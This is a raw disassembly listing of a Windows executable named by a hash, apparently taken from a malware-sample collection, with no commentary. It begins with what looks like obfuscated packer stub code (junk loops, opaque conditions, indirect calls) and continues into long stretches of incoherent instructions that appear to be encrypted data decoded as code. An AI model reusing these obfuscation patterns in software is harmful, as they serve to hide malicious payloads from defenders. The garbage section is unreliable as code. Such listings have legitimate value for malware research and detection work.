
1797ebd0f50a6421c20b0dafc9d1fb452a747242289720270664c0511ccbd994.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	adc    ecx,0x2570
  401012:	push   ebx
  401013:	adc    DWORD PTR ds:0x42a292,ecx
  401019:	push   esi
  40101a:	mov    DWORD PTR ds:0x42a266,0x13
  401024:	cmp    DWORD PTR ds:0x42a266,0x0
  40102b:	je     0x401070
  401031:	cmp    DWORD PTR ds:0x42a266,0x23
  401038:	jg     0x401070
  40103e:	jmp    0x40105e
  401043:	push   0x1
  401045:	push   0x4b7c
  40104a:	push   DWORD PTR [ebp-0x28]
  40104d:	push   DWORD PTR [ebp-0x1c]
  401050:	push   0x4108
  401055:	push   DWORD PTR [ebp-0xc]
  401058:	call   DWORD PTR ds:0x42a3c2
  40105e:	mov    ecx,DWORD PTR ds:0x42a266
  401064:	dec    ecx
  401065:	mov    DWORD PTR ds:0x42a266,ecx
  40106b:	jmp    0x401024
  401070:	push   edi
  401071:	mov    esi,0x75108aa
  401076:	sbb    DWORD PTR ds:0x42a266,0x4c4b
  401080:	xor    eax,esi
  401082:	and    DWORD PTR ds:0x42a26e,0x59cd
  40108c:	mov    edi,0x3272f1
  401091:	mov    ecx,DWORD PTR ds:0x42a26a
  401097:	sbb    ecx,DWORD PTR ds:0x42a2aa
  40109d:	mov    DWORD PTR ds:0x42a26a,ecx
  4010a3:	add    eax,edi
  4010a5:	and    DWORD PTR ds:0x42a296,0x0
  4010af:	jmp    0x4010c3
  4010b4:	xor    ecx,ecx
  4010b6:	xor    ecx,DWORD PTR ds:0x42a296
  4010bc:	inc    ecx
  4010bd:	mov    DWORD PTR ds:0x42a296,ecx
  4010c3:	cmp    DWORD PTR ds:0x42a296,0x1e
  4010ca:	jae    0x401113
  4010d0:	cmp    DWORD PTR ds:0x42a296,0xe
  4010d7:	ja     0x401113
  4010dd:	jmp    0x4010f2
  4010e2:	push   0x42a25e
  4010e7:	push   0x42916d
  4010ec:	call   DWORD PTR ds:0x42a3ca
  4010f2:	cmp    DWORD PTR ds:0x42a296,0xd
  4010f9:	jne    0x40110e
  4010ff:	xor    ecx,ecx
  401101:	or     ecx,DWORD PTR ds:0x42a296
  401107:	inc    ecx
  401108:	mov    DWORD PTR ds:0x42a296,ecx
  40110e:	jmp    0x4010b4
  401113:	mov    DWORD PTR [ebp-0x40],eax
  401116:	mov    eax,ds:0x42a2ca
  40111b:	sbb    DWORD PTR ds:0x42a25a,eax
  401121:	mov    eax,ds:0x42929e
  401126:	sub    DWORD PTR ds:0x42a2fa,ecx
  40112c:	mov    eax,DWORD PTR [eax]
  40112e:	mov    DWORD PTR [ebp-0x3c],eax
  401131:	inc    eax
  401132:	mov    eax,ds:0x4294ae
  401137:	and    DWORD PTR ds:0x42a26a,0x0
  401141:	jmp    0x401153
  401146:	mov    ecx,DWORD PTR ds:0x42a26a
  40114c:	inc    ecx
  40114d:	mov    DWORD PTR ds:0x42a26a,ecx
  401153:	cmp    DWORD PTR ds:0x42a26a,0x1f
  40115a:	jae    0x40119f
  401160:	cmp    DWORD PTR ds:0x42a26a,0x4
  401167:	jge    0x40119f
  40116d:	jmp    0x401180
  401172:	push   DWORD PTR [ebp-0x18]
  401175:	push   0x42a2c6
  40117a:	call   DWORD PTR ds:0x42a3ce
  401180:	cmp    DWORD PTR ds:0x42a26a,0x3
  401187:	jne    0x40119a
  40118d:	mov    ecx,DWORD PTR ds:0x42a26a
  401193:	inc    ecx
  401194:	mov    DWORD PTR ds:0x42a26a,ecx
  40119a:	jmp    0x401146
  40119f:	mov    eax,DWORD PTR [eax]
  4011a1:	add    ecx,0x507d
  4011a7:	mov    DWORD PTR [ebp-0x1c],eax
  4011aa:	xor    ecx,0x7815
  4011b0:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  4011b7:	or     DWORD PTR ds:0x42a2da,0x4fa4
  4011c1:	mov    eax,DWORD PTR [ebp-0x34]
  4011c4:	xor    eax,esi
  4011c6:	sub    ecx,DWORD PTR ds:0x42a2ce
  4011cc:	add    eax,edi
  4011ce:	and    DWORD PTR ds:0x42a266,edi
  4011d4:	mov    DWORD PTR [ebp-0x40],eax
  4011d7:	mov    eax,ds:0x42941e
  4011dc:	mov    DWORD PTR [ebp-0x40],eax
  4011df:	xor    eax,0x2e62
  4011e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4011e7:	mov    DWORD PTR [ebp-0x14],eax
  4011ea:	and    DWORD PTR ds:0x42a2de,0x0
  4011f4:	xor    ecx,ecx
  4011f6:	xor    ecx,DWORD PTR ds:0x42a2de
  4011fc:	inc    ecx
  4011fd:	mov    DWORD PTR ds:0x42a2de,ecx
  401203:	cmp    DWORD PTR ds:0x42a2de,0xb
  40120a:	ja     0x401250
  401210:	jmp    0x401229
  401215:	push   DWORD PTR [ebp-0x14]
  401218:	push   0x42a25e
  40121d:	push   DWORD PTR [ebp-0x18]
  401220:	push   DWORD PTR [ebp-0x20]
  401223:	call   DWORD PTR ds:0x42a3d2
  401229:	cmp    DWORD PTR ds:0x42a2de,0xa
  401230:	jne    0x401243
  401236:	mov    ecx,DWORD PTR ds:0x42a2de
  40123c:	inc    ecx
  40123d:	mov    DWORD PTR ds:0x42a2de,ecx
  401243:	cmp    DWORD PTR ds:0x42a2de,0x12
  40124a:	jb     0x4011f4
  401250:	mov    eax,DWORD PTR [ebp-0x14]
  401253:	adc    DWORD PTR ds:0x42a2ee,edx
  401259:	push   0x4
  40125b:	pop    ecx
  40125c:	or     DWORD PTR ds:0x42a256,0x42a2ba
  401266:	sub    ecx,eax
  401268:	and    DWORD PTR ds:0x42a2ae,edx
  40126e:	add    ecx,DWORD PTR [ebp-0x1c]
  401271:	sub    DWORD PTR ds:0x42a25a,0x29a3
  40127b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401282:	adc    DWORD PTR ds:0x42a2ba,0x27f4
  40128c:	mov    DWORD PTR [ebp-0x18],ecx
  40128f:	xor    eax,eax
  401291:	xor    eax,DWORD PTR ds:0x42a2c2
  401297:	or     DWORD PTR ds:0x42a276,eax
  40129d:	jmp    0x4035f6
  4012a2:	scas   eax,DWORD PTR es:[edi]
  4012a3:	cdq    
  4012a4:	and    DWORD PTR [ebx],edx
  4012a6:	add    DWORD PTR [ebx+0x10ba9981],ecx
  4012ac:	cwde   
  4012ad:	int    0xeb
  4012af:	shr    DWORD PTR [ecx],0x36
  4012b2:	add    DWORD PTR [ebx+0x5e478383],0xffffff83
  4012b9:	and    DWORD PTR [ebp*1+0x34203826],0x22
  4012c1:	cs je  0x401303
  4012c4:	jo     0x40133d
  4012c6:	pop    ds
  4012c7:	jno    0x401335
  4012c9:	jae    0x401337
  4012cb:	dec    ebx
  4012cc:	aam    0xdd
  4012ce:	clc    
  4012cf:	imul   edx,DWORD PTR [ecx+0x72],0x79a96278
  4012d6:	ins    BYTE PTR es:[edi],dx
  4012d7:	pusha  
  4012d8:	into   
  4012d9:	pop    esp
  4012da:	push   ebx
  4012db:	cmp    DWORD PTR [ebp+0x66879603],ecx
  4012e1:	dec    esp
  4012e2:	jle    0x40132a
  4012e4:	mov    DWORD PTR [edi+0x42bbb97e],esi
  4012ea:	sub    eax,0x3dd77fe
  4012ef:	push   0x7e
  4012f1:	pop    ds
  4012f2:	in     al,dx
  4012f3:	inc    eax
  4012f4:	int3   
  4012f5:	ret    
  4012f6:	in     al,dx
  4012f7:	xchg   esi,eax
  4012f8:	sub    bl,bh
  4012fa:	xchg   edx,eax
  4012fb:	xor    BYTE PTR [esi],cl
  4012fd:	pusha  
  4012fe:	mov    dl,0x93
  401300:	aad    0x6
  401302:	ins    BYTE PTR es:[edi],dx
  401303:	fcom   QWORD PTR ds:0x37030fe5
  401309:	and    DWORD PTR [ecx+0xd],edx
  40130c:	aaa    
  40130d:	jb     0x401380
  40130f:	shr    BYTE PTR [esi-0x48eba7d6],0xfe
  401316:	lock push eax
  401318:	xor    al,BYTE PTR [ebp+0x62d14b]
  40131e:	and    eax,DWORD PTR [ebx]
  401320:	cmp    DWORD PTR [eax+0x5ea1dc7a],0x2516b892
  40132a:	fwait
  40132b:	dec    eax
  40132c:	or     bl,BYTE PTR [edi+0x128a8b3d]
  401332:	jecxz  0x401360
  401334:	imul   ecx,DWORD PTR [ebp+eax*2-0x31059ab6],0xffffff93
  40133c:	xor    BYTE PTR [eax-0x6e323937],dl
  401342:	push   0x4d6b54f5
  401347:	or     eax,0x1a470a3f
  40134c:	lods   al,BYTE PTR ds:[esi]
  40134d:	push   edx
  40134e:	shl    DWORD PTR [esi+0x6715d949],cl
  401354:	cld    
  401355:	imul   esp,DWORD PTR [edi-0x4c],0x0
  401359:	jno    0x401319
  40135b:	add    DWORD PTR [ebx+0x27],ebx
  40135e:	nop
  40135f:	sahf   
  401360:	mov    ds:0xba48cbcf,al
  401365:	cld    
  401366:	nop
  401367:	jl     0x4013db
  401369:	jmp    0xc58b6389
  40136e:	xchg   edx,eax
  40136f:	and    esp,DWORD PTR [esi-0x52470ef8]
  401375:	xchg   edx,eax
  401376:	sbb    ch,BYTE PTR [esi+0x2b]
  401379:	mov    edi,0x33aa0de1
  40137f:	and    cl,bh
  401381:	xlat   BYTE PTR ds:[ebx]
  401382:	or     dl,BYTE PTR [ecx]
  401384:	retf   
  401385:	adc    BYTE PTR [eax-0x77ce2c0c],ah
  40138b:	outs   dx,DWORD PTR ds:[esi]
  40138c:	mov    esp,0x72e581ce
  401391:	pop    ss
  401392:	in     eax,dx
  401393:	jne    0x401400
  401395:	ficom  WORD PTR [ecx+0x4daffe10]
  40139b:	jp     0x40140b
  40139d:	lods   al,BYTE PTR ds:[esi]
  40139e:	inc    edx
  40139f:	mov    cl,0x2a
  4013a1:	rcr    ebx,1
  4013a3:	mov    eax,0x6d33afa8
  4013a8:	stos   DWORD PTR es:[edi],eax
  4013a9:	(bad)
  4013ad:	inc    esi
  4013ae:	push   ss
  4013af:	jne    0x4013c8
  4013b1:	std    
  4013b2:	or     ebp,DWORD PTR [ecx-0x775d307a]
  4013b8:	sub    ebp,ebx
  4013ba:	popa   
  4013bb:	jno    0x401399
  4013bd:	lock pop ss
  4013bf:	fidivr WORD PTR [esi+ebx*4-0x46]
  4013c3:	popf   
  4013c4:	jle    0x401434
  4013c6:	xchg   BYTE PTR [eax+0x1c],dh
  4013c9:	ficom  WORD PTR [ebx-0x131b9630]
  4013cf:	pop    eax
  4013d0:	sti    
  4013d1:	frstor [edx+0x3f4c904f]
  4013d7:	jl     0x4013fa
  4013d9:	add    al,0x8e
  4013db:	popa   
  4013dc:	xchg   edi,eax
  4013dd:	lods   eax,DWORD PTR ds:[esi]
  4013de:	xchg   BYTE PTR [edi+0x5e],ah
  4013e1:	push   ds
  4013e2:	cmp    eax,0xb3e60043
  4013e7:	mov    al,ds:0xe740dc02
  4013ec:	pop    ds
  4013ed:	lods   eax,DWORD PTR ds:[esi]
  4013ee:	mov    DWORD PTR [eax-0x3d],edx
  4013f1:	inc    edx
  4013f2:	push   ebp
  4013f3:	retf   
  4013f4:	jl     0x4013eb
  4013f6:	cmp    al,0x53
  4013f8:	pop    edi
  4013f9:	mov    ebp,0xfa08c8a7
  4013fe:	cmp    BYTE PTR gs:[ebx],cl
  401401:	xchg   ebx,eax
  401402:	inc    ebp
  401403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401404:	cld    
  401405:	dec    esp
  401406:	push   eax
  401407:	push   cs
  401408:	enter  0x7a48,0xb6
  40140c:	push   edx
  40140d:	sbb    al,0x15
  40140f:	dec    edi
  401410:	jnp    0x401410
  401412:	std    
  401413:	ret    
  401414:	xor    DWORD PTR ds:0x3242828c,eax
  40141a:	stos   BYTE PTR es:[edi],al
  40141b:	jns    0x40140c
  40141d:	nop
  40141e:	cmp    al,0x97
  401420:	push   edx
  401421:	xlat   BYTE PTR ds:[ebx]
  401422:	cld    
  401423:	mov    ebx,0x388bb3d2
  401428:	jo     0x40141e
  40142a:	dec    edx
  40142b:	addr16 xchg ebx,eax
  40142d:	pop    edx
  40142e:	idiv   DWORD PTR [edi-0x5563a8c1]
  401434:	xor    edx,esi
  401436:	cmp    dh,bh
  401438:	cld    
  401439:	inc    esp
  40143a:	stos   BYTE PTR es:[edi],al
  40143b:	ja     0x40146e
  40143d:	in     al,0x30
  40143f:	xchg   edx,eax
  401440:	out    dx,al
  401441:	sub    dh,BYTE PTR [ebp+0x2aa915b8]
  401447:	ja     0x401443
  401449:	pop    ds
  40144a:	lock js 0x40146e
  40144d:	xor    DWORD PTR [edx+0x1],eax
  401450:	addr16 (bad) 
  401452:	imul   eax,DWORD PTR [edx],0x5d6f8def
  401458:	push   eax
  401459:	cld    
  40145a:	mov    ebp,DWORD PTR [edi]
  40145c:	pop    esp
  40145d:	pushf  
  40145e:	pop    es
  40145f:	xchg   ebp,eax
  401460:	addr16 push esi
  401462:	dec    esp
  401463:	data16 mov al,0x81
  401466:	adc    DWORD PTR [edx],edx
  401468:	in     eax,0xff
  40146a:	add    DWORD PTR [eax+0x63],esi
  40146d:	jge    0x401499
  40146f:	pop    ecx
  401470:	and    BYTE PTR [edx+0x56],cl
  401473:	and    al,0xaf
  401475:	cmp    DWORD PTR [ebp-0x2c7a41f5],ebx
  40147b:	call   0x58b0538f
  401480:	pop    ss
  401481:	shl    DWORD PTR [esi-0x5debe20e],1
  401487:	fwait
  401488:	mov    edi,0xcd324ba1
  40148d:	sti    
  40148e:	pop    eax
  40148f:	or     al,0x8d
  401491:	cwde   
  401492:	test   DWORD PTR [ecx+0x25],eax
  401495:	jno    0x40149d
  401497:	ins    BYTE PTR es:[edi],dx
  401498:	fmul   DWORD PTR [edx+0x75]
  40149b:	pop    ecx
  40149c:	iret   
  40149d:	adc    DWORD PTR [ebx],0x2ea3a659
  4014a3:	lods   al,BYTE PTR ds:[esi]
  4014a4:	fidivr DWORD PTR [ebx+0x9]
  4014a7:	in     eax,dx
  4014a8:	mov    dh,0xf1
  4014aa:	lahf   
  4014ab:	cmp    al,0x1a
  4014ad:	je     0x401472
  4014af:	cmp    BYTE PTR [ebx],0x6
  4014b2:	call   0x45ff:0xf8e400c7
  4014b9:	or     ah,dh
  4014bb:	jl     0x4014a4
  4014bd:	mov    ch,0x93
  4014bf:	sbb    esp,edi
  4014c1:	int3   
  4014c2:	sub    edi,edx
  4014c4:	(bad)  
  4014c5:	sar    BYTE PTR [edx],1
  4014c7:	icebp  
  4014c8:	neg    DWORD PTR [edx+0x4b]
  4014cb:	xchg   BYTE PTR [edx],ch
  4014cd:	es push edi
  4014cf:	imul   ebx,DWORD PTR [eax],0xffffffad
  4014d2:	retf   
  4014d3:	aaa    
  4014d4:	xchg   edx,eax
  4014d5:	xchg   ebx,eax
  4014d6:	push   0xae7078ab
  4014db:	jl     0x401525
  4014dd:	repnz sti 
  4014df:	in     al,dx
  4014e0:	sub    eax,0x41439119
  4014e5:	ret    0xeb0
  4014e8:	call   0x5534afc6
  4014ed:	dec    esi
  4014ee:	aaa    
  4014ef:	push   edx
  4014f0:	dec    eax
  4014f1:	call   0x70bfd5ca
  4014f6:	cmc    
  4014f7:	or     DWORD PTR [edx],ebp
  4014f9:	popf   
  4014fa:	enter  0xa732,0x9f
  4014fe:	xchg   esp,eax
  4014ff:	pusha  
  401500:	out    dx,al
  401501:	adc    ebp,DWORD PTR [eax+0x41]
  401504:	mov    ds:0xf549b38f,al
  401509:	cmp    al,BYTE PTR [ebx+edi*2-0x66]
  40150d:	dec    esi
  40150e:	jns    0x4014b5
  401510:	jl     0x401588
  401512:	call   0x36d7869a
  401517:	adc    eax,0xd35b8a41
  40151c:	cmp    DWORD PTR ds:0x299b7ad4,ecx
  401522:	nop
  401523:	aaa    
  401524:	(bad)  
  401525:	mov    edx,0x67b4daeb
  40152a:	push   esp
  40152b:	shl    DWORD PTR [esi+edx*4-0x77d02062],cl
  401532:	cmp    DWORD PTR [ecx-0x2bb41289],esi
  401538:	dec    eax
  401539:	mov    ecx,0x527fcfd1
  40153e:	(bad)  
  40153f:	lock shl bh,1
  401542:	jge    0x4015a2
  401544:	mov    ebx,0x95358a3d
  401549:	fist   WORD PTR ds:0xd280051d
  40154f:	movq   mm6,QWORD PTR [esi]
  401552:	mov    ds:0x790011cd,al
  401557:	iret   
  401558:	adc    esp,esi
  40155a:	mul    edi
  40155c:	lea    esi,[ebx+0x16b7d63c]
  401562:	adc    al,0x44
  401564:	std    
  401565:	pop    edx
  401566:	cmp    bh,bl
  401568:	ret    0x20e1
  40156b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40156c:	leave  
  40156d:	xor    eax,0x2209c9d3
  401572:	neg    BYTE PTR [esi]
  401574:	cld    
  401575:	test   BYTE PTR ds:0x9dee4535,0x75
  40157c:	enter  0xbc1f,0x32
  401580:	push   ss
  401581:	inc    esi
  401582:	or     bl,BYTE PTR [esi-0x65621a87]
  401588:	pop    esp
  401589:	stos   BYTE PTR es:[edi],al
  40158a:	push   edi
  40158b:	fnstcw WORD PTR [esi+0x290854a2]
  401591:	das    
  401592:	leave  
  401593:	jecxz  0x40152c
  401595:	cmp    bh,cl
  401597:	and    al,0xe1
  401599:	aad    0x5f
  40159b:	cmp    eax,0x63e8cc22
  4015a0:	xor    DWORD PTR [ecx],esp
  4015a2:	clc    
  4015a3:	xchg   bx,ax
  4015a5:	nop
  4015a6:	ds repz push ebx
  4015a9:	push   eax
  4015aa:	ja     0x401611
  4015ac:	int    0xb
  4015ae:	pop    es
  4015af:	inc    ecx
  4015b0:	retf   
  4015b1:	arpl   ax,cx
  4015b3:	pop    ss
  4015b4:	(bad)  
  4015b6:	outs   dx,BYTE PTR ds:[esi]
  4015b7:	pop    esp
  4015b8:	test   BYTE PTR [ecx+ebx*4+0x65],bl
  4015bc:	mov    WORD PTR [edi+0x50aea042],?
  4015c2:	jo     0x4015de
  4015c4:	das    
  4015c5:	push   esi
  4015c6:	ins    DWORD PTR es:[edi],dx
  4015c7:	jo     0x401578
  4015c9:	mov    ebx,0xef55ae98
  4015ce:	or     esp,DWORD PTR [ebx]
  4015d0:	xchg   BYTE PTR ds:0xa9958a53,bh
  4015d6:	retf   
  4015d7:	xchg   esp,eax
  4015d8:	(bad)  
  4015d9:	lods   al,BYTE PTR ds:[esi]
  4015da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015db:	enter  0x8864,0x77
  4015df:	and    eax,0x84749cea
  4015e4:	loopne 0x4015fd
  4015e6:	pop    edi
  4015e7:	aas    
  4015e8:	(bad)  
  4015e9:	cwde   
  4015ea:	stos   DWORD PTR es:[edi],eax
  4015eb:	push   ecx
  4015ec:	test   eax,0x6c1161bd
  4015f1:	jl     0x401577
  4015f3:	sbb    al,0x3b
  4015f5:	sbb    BYTE PTR [ecx],dl
  4015f7:	cdq    
  4015f8:	mov    esp,0x595688a3
  4015fd:	nop
  4015fe:	mov    bh,0xa6
  401600:	cmp    cl,dl
  401602:	or     esi,edx
  401604:	mov    ch,BYTE PTR ds:0x71f82f6f
  40160a:	push   ebp
  40160b:	test   al,0xdb
  40160d:	shl    ebx,0x1c
  401610:	scas   eax,DWORD PTR es:[edi]
  401611:	jne    0x40161e
  401613:	mov    WORD PTR [ecx-0x6c70d0da],ds
  401619:	xor    edi,DWORD PTR [ecx+ebp*1+0x1d009f55]
  401620:	add    al,0x6f
  401622:	push   ecx
  401623:	dec    ebx
  401624:	lea    ebx,[ebx+ebp*8-0x7a]
  401628:	in     eax,dx
  401629:	push   ebx
  40162a:	cmp    esp,DWORD PTR [eax]
  40162c:	test   DWORD PTR [eax-0x5a],edx
  40162f:	cdq    
  401630:	lock andnps xmm2,XMMWORD PTR [ebx]
  401634:	sbb    eax,0x59ad4996
  401639:	fs add eax,0x2da9139e
  40163f:	bound  edx,QWORD PTR [edx]
  401641:	jg     0x401675
  401643:	imul   BYTE PTR [edx+edx*8-0x56]
  401647:	out    dx,eax
  401648:	mov    ecx,0x88529534
  40164d:	push   eax
  40164e:	cli    
  40164f:	push   esp
  401650:	mov    al,ds:0xe220781e
  401655:	add    eax,0xe47b2bc
  40165a:	sub    BYTE PTR [ebx+eiz*1],ch
  40165d:	dec    edi
  40165e:	and    al,0xf5
  401660:	adc    ch,0x81
  401663:	or     DWORD PTR [ebx+esi*4],esi
  401666:	pop    edx
  401667:	mov    ch,0xbe
  401669:	add    al,0x9b
  40166b:	pop    ds
  40166c:	push   ds
  40166d:	add    al,0x59
  40166f:	cmp    al,0xf9
  401671:	outs   dx,BYTE PTR ds:[esi]
  401672:	mov    ebx,0x72a8c7cd
  401677:	xchg   edi,eax
  401678:	xor    ecx,ebp
  40167a:	sub    DWORD PTR [esi],0x5e19aa56
  401680:	sub    al,BYTE PTR [ecx]
  401682:	fistp  QWORD PTR [ebx-0x5c2d3cd7]
  401688:	inc    esi
  401689:	sbb    bh,BYTE PTR [ebp-0x6ece2f8f]
  40168f:	inc    ebp
  401690:	data16 and BYTE PTR [bp+0x2f],ch
  401695:	psubb  mm3,QWORD PTR [ebp-0x5c66f8ce]
  40169c:	mov    ecx,0xcf2d580b
  4016a1:	add    ebp,DWORD PTR [esi]
  4016a3:	jmp    0x4016d8
  4016a5:	nop
  4016a6:	mov    es,edi
  4016a8:	call   0x76a18997
  4016ad:	cld    
  4016ae:	mov    ebp,0x8fef341
  4016b3:	and    BYTE PTR [esi+0x24ca3b6f],0xdc
  4016ba:	sar    edi,1
  4016bc:	mov    bh,dl
  4016be:	xor    al,0xe3
  4016c0:	lea    ebx,[edx-0x233d5572]
  4016c6:	gs dec ebp
  4016c8:	sbb    DWORD PTR [ecx-0x31],ebp
  4016cb:	lahf   
  4016cc:	and    ax,dx
  4016cf:	mov    edi,0xf08a43c4
  4016d4:	bound  edx,QWORD PTR [ebx+eiz*1-0x5d582bdb]
  4016db:	in     eax,0xd7
  4016dd:	out    0xaa,eax
  4016df:	push   ebp
  4016e0:	fadd   st(3),st
  4016e2:	sub    BYTE PTR [edi+0x36acb5b1],ah
  4016e8:	pop    ebx
  4016e9:	add    DWORD PTR [eax],esp
  4016eb:	test   eax,0x6c149715
  4016f0:	out    0xad,al
  4016f2:	std    
  4016f3:	jmp    0x658a:0x4f5a58c
  4016fa:	lock adc edi,DWORD PTR [edx+0x71ab35ed]
  401701:	cwde   
  401702:	and    BYTE PTR [ecx+0x9a04243],bl
  401708:	loopne 0x4016c5
  40170a:	adc    DWORD PTR [ebx+0x25],ebx
  40170d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40170e:	inc    esi
  40170f:	fiadd  DWORD PTR [edi+esi*8-0x54507bfd]
  401716:	or     esi,DWORD PTR [eax-0x456fb20b]
  40171c:	sub    BYTE PTR [eax+ebp*8],dh
  40171f:	fidivr DWORD PTR [edx]
  401721:	cli    
  401722:	lods   eax,DWORD PTR ds:[esi]
  401723:	or     al,0x3b
  401725:	push   ecx
  401726:	push   ss
  401727:	je     0x401762
  401729:	jp     0x4016f5
  40172b:	scas   al,BYTE PTR es:[edi]
  40172c:	mov    ecx,0xe160c93d
  401731:	mov    cl,ch
  401733:	jb     0x4016d6
  401735:	push   0x4fa0557b
  40173a:	push   ebx
  40173b:	push   esi
  40173c:	inc    edi
  40173d:	sub    ch,0x11
  401740:	lock sbb bh,BYTE PTR ds:0x6c999c3
  401747:	call   0x5167beea
  40174c:	shl    BYTE PTR [edi],cl
  40174e:	push   ecx
  40174f:	das    
  401750:	inc    esp
  401751:	hlt    
  401752:	iret   
  401753:	nop
  401754:	dec    esp
  401755:	(bad)  
  401756:	mov    al,0xa5
  401758:	adc    eax,0x59efde90
  40175d:	xor    dl,BYTE PTR [ecx-0x29]
  401760:	bnd call 0x5a174aec
  401766:	and    ebp,eax
  401768:	loop   0x4017c4
  40176a:	or     BYTE PTR [ebx],bl
  40176c:	add    bh,dl
  40176e:	das    
  40176f:	(bad)  
  401770:	les    ebx,FWORD PTR [ecx+0x1770647f]
  401776:	lock mov bh,0xcf
  401779:	cmp    ah,BYTE PTR [eax+0x512e5690]
  40177f:	pop    esp
  401780:	cmp    ebx,DWORD PTR ds:0xd2c026ea
  401786:	xlat   BYTE PTR ds:[ebx]
  401787:	(bad)  
  401789:	shl    DWORD PTR [edx-0x35],cl
  40178c:	pop    es
  40178d:	in     al,dx
  40178e:	outs   dx,BYTE PTR ds:[esi]
  401790:	pop    eax
  401791:	repz add dh,BYTE PTR [edi-0x32]
  401795:	cdq    
  401796:	or     al,0x70
  401798:	js     0x401792
  40179a:	lea    esp,[ebx]
  40179c:	data16 fwait
  40179e:	jns    0x40175f
  4017a0:	data16 cmc 
  4017a2:	xor    eax,0x8ca2c451
  4017a7:	add    eax,0xffffffd7
  4017aa:	fs xchg ecx,eax
  4017ac:	outs   dx,DWORD PTR ds:[esi]
  4017ad:	mov    edi,cs
  4017af:	and    eax,0xd6fbf4c0
  4017b4:	pop    edx
  4017b5:	shl    esp,1
  4017b7:	lock xchg BYTE PTR [eax],dh
  4017ba:	ror    BYTE PTR [ebp+ebx*1+0x73],1
  4017be:	push   eax
  4017bf:	jecxz  0x401749
  4017c1:	mov    WORD PTR [ebp+0x26],?
  4017c4:	jg     0x4017fb
  4017c6:	cmc    
  4017c7:	sub    ch,bh
  4017c9:	pop    es
  4017ca:	inc    ebp
  4017cb:	arpl   WORD PTR [esp+eax*2-0x46ae0bbc],ax
  4017d2:	dec    edi
  4017d3:	mov    cl,0xe0
  4017d5:	shl    BYTE PTR [eax+0x56ae8c36],1
  4017db:	inc    ebx
  4017dc:	fisttp QWORD PTR [edx+edx*2]
  4017df:	aad    0xa2
  4017e1:	xor    BYTE PTR [edi+edi*2-0x787da11f],0x4
  4017e9:	ins    BYTE PTR es:[edi],dx
  4017ea:	add    eax,0xf34d88ca
  4017ef:	cld    
  4017f0:	add    BYTE PTR [esi+0x840f036],cl
  4017f6:	ficomp WORD PTR [edi+0x7b37f04a]
  4017fc:	add    esi,DWORD PTR [edi]
  4017fe:	sbb    al,0x4a
  401800:	sbb    dh,cl
  401802:	pop    edx
  401803:	ror    DWORD PTR [ecx-0x79888d52],cl
  401809:	sti    
  40180a:	sti    
  40180b:	and    ebx,DWORD PTR [esi+0x15]
  40180e:	pop    edx
  40180f:	adc    ch,BYTE PTR [eax+0x2c412c7f]
  401815:	test   eax,0xd940b716
  40181a:	fbstp  TBYTE PTR [ebp+0x65fea00]
  401820:	call   0x1207efa2
  401825:	or     edi,DWORD PTR [ebx]
  401827:	rcr    BYTE PTR [edx],0x45
  40182a:	and    ecx,esi
  40182c:	mov    edi,0x24862fdb
  401831:	jle    0x40180d
  401833:	dec    eax
  401834:	ret    
  401835:	jno    0x401874
  401837:	fmul   st(6),st
  401839:	xchg   ebx,eax
  40183a:	fmul   QWORD PTR [esi-0x76b7ca5f]
  401840:	scas   eax,DWORD PTR es:[edi]
  401841:	std    
  401842:	mov    bl,0xe1
  401844:	or     DWORD PTR [ecx+0x2d],edx
  401847:	mov    cl,0x4b
  401849:	dec    esp
  40184a:	inc    ebx
  40184b:	jbe    0x401803
  40184d:	ret    0x1369
  401850:	pop    ds
  401851:	sub    al,0xf3
  401853:	push   ds
  401854:	push   0xffffffb9
  401856:	jecxz  0x401885
  401858:	shr    BYTE PTR ds:0x2fe14dad,0x43
  40185f:	shl    ebp,cl
  401861:	stos   BYTE PTR es:[edi],al
  401862:	call   0x4ce1e09
  401867:	in     al,0x20
  401869:	pop    ebx
  40186a:	sti    
  40186b:	mov    dh,0xe3
  40186d:	test   eax,0xa11a4f5a
  401872:	mov    bh,0x5a
  401874:	test   eax,0x95789ed1
  401879:	lds    esi,FWORD PTR [esi+0x58]
  40187c:	cmp    edi,DWORD PTR [edx+ebp*1]
  40187f:	out    dx,eax
  401880:	les    ecx,FWORD PTR [eax]
  401882:	test   eax,0x8ab924cf
  401887:	adc    esi,DWORD PTR ds:0x9be4dd4c
  40188d:	stos   DWORD PTR es:[edi],eax
  40188e:	imul   ecx,esi,0xffffff9e
  401891:	pushf  
  401892:	jle    0x401906
  401894:	pop    es
  401895:	stos   BYTE PTR es:[edi],al
  401896:	sub    ax,0x8ada
  40189a:	lahf   
  40189b:	not    DWORD PTR [edx]
  40189d:	mov    cl,0xc5
  40189f:	or     DWORD PTR [esi+0x7b62c831],ecx
  4018a5:	cmovns esp,DWORD PTR [eax+0x67]
  4018a9:	data16 or BYTE PTR [edi],cl
  4018ac:	mov    eax,ds:0xea04a61c
  4018b1:	inc    edx
  4018b2:	mov    BYTE PTR [edx+edi*2+0x44],ch
  4018b6:	xchg   BYTE PTR [edi+0x2b],dh
  4018b9:	inc    edx
  4018ba:	fucompp 
  4018bc:	sub    DWORD PTR [edi+0xd],esi
  4018bf:	xor    edi,esp
  4018c1:	in     al,0x4a
  4018c3:	inc    edi
  4018c4:	sbb    ebx,DWORD PTR [esi]
  4018c6:	cmp    eax,0x13a9e574
  4018cb:	bound  edi,QWORD PTR [ebp-0x41d59f38]
  4018d1:	fdivr  DWORD PTR [esi+0x208d1c54]
  4018d7:	fmul   DWORD PTR [edx-0x65e9e9ba]
  4018dd:	xor    ebp,eax
  4018df:	push   es
  4018e0:	mov    ds:0x28452c,al
  4018e5:	push   esp
  4018e6:	dec    edx
  4018e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018e8:	mov    edx,0x6a7df11c
  4018ed:	cmp    al,0xc8
  4018ef:	in     al,0xdf
  4018f1:	cmc    
  4018f2:	ret    
  4018f3:	je     0x401916
  4018f5:	lods   al,BYTE PTR ds:[esi]
